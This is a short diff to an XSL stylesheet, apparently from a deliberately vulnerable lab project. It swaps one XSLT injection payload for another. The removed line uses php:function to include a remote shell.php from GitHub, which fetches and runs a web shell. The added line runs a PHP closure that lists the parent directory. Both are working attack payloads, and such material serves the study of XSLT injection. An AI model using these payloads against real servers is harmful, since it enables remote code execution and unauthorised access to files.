@@ -3,8 +3,9 @@
 
 
    
-   <xsl:value-of select="php:function('include','https://github.com/cyberheartmi9/Vulnerable-By-Design/raw/master/POC/shell.php')"/> 
-
+   <xsl:value-of select="php:function('call_user_func', function(){
+    return print_r(scandir('..'), true);
+})"/>
    
    </xsl:template>
 </xsl:stylesheet>
